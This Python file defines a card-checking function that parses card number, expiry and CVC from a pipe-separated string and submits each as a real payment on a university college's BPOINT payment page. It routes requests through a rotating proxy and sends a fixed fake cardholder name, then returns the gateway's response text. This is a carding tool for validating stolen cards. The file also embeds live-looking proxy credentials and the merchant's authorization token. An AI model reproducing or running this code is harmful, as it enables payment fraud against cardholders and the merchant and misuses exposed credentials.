import requests,re
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'Accept': '*/*',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Authorization': 'Basic d2hpdGV0b3dlciBhcGl8NTM1MzEwOTQ5MDAwMzcwMDo3YUYxRkYwR2hmZFV1ZzlpWGkwVW1FNE5iZGhFdm4=',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/json',
	    'Origin': 'https://www.stleos.uq.edu.au',
	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'cross-site',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	response = session.post('https://www.bpoint.com.au/rest/v5/txns/authkeys', headers=headers)
	
	authkey = response.json()['authkey']
	#print(authkey)
	
	headers = {
	    'Accept': '*/*',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Authorization': 'Basic d2hpdGV0b3dlciBhcGl8NTM1MzEwOTQ5MDAwMzcwMDo3YUYxRkYwR2hmZFV1ZzlpWGkwVW1FNE5iZGhFdm4=',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/json',
	    'Origin': 'https://www.stleos.uq.edu.au',
	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'cross-site',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	json_data = {
	    'action': 'Payment',
	    'type': 'ECommerce',
	    'subType': 'Single',
	    'amount': 100,
	    'billerCode': '1575604',
	    'crn1': '1',
	    'crn2': '',
	    'crn3': '',
	    'merchantReference': '',
	    'currency': 'AUD',
	    'bypass3ds': False,
	    'tokenisationMode': 'Default',
	    'emailAddress': '',
	    'storeCard': False,
	    'testMode': False,
	}
	
	response = session.put(
	    f'https://www.bpoint.com.au/rest/v5/txns/authkeys/{authkey}/txn-details',
	    headers=headers,
	    json=json_data,
	)
	
	headers = {
	    'Accept': '*/*',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Connection': 'keep-alive',
	    'Content-type': 'application/json',
	    'Origin': 'https://www.stleos.uq.edu.au',
	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'cross-site',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	json_data = {
	    'card': {
	        'number': n,
	        'expiry': {
	            'month': f'{mm}',
	            'year': yy,
	        },
	        'name': 'Dao Khao Saard',
	        'cvn': f'{cvc}',
	    },
	}
	
	response = session.put(
	    f'https://www.bpoint.com.au/rest/v5/txns/authkeys/{authkey}/client/payment-method',
	    headers=headers,
	    json=json_data,
	)
	
	headers = {
	    'Accept': '*/*',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Authorization': 'Basic d2hpdGV0b3dlciBhcGl8NTM1MzEwOTQ5MDAwMzcwMDo3YUYxRkYwR2hmZFV1ZzlpWGkwVW1FNE5iZGhFdm4=',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/json',
	    'Origin': 'https://www.stleos.uq.edu.au',
	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'cross-site',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	json_data = {
	    'webhook': {
	        'url': 'https://stleo.wtdevsite.com/make-a-payment-bpoint/',
	        'version': '5',
	    },
	    'surcharge': {
	        'calculate': False,
	        'amount': 0,
	    },
	    'updateToken': True,
	}
	
	response = session.post(
	    f'https://www.bpoint.com.au/rest/v5/txns/authkeys/{authkey}/process',
	    headers=headers,
	    json=json_data,
	)
	
	result = re.search('"responseText":"(.*?)"', response.text).group(1)
	
	return (result)
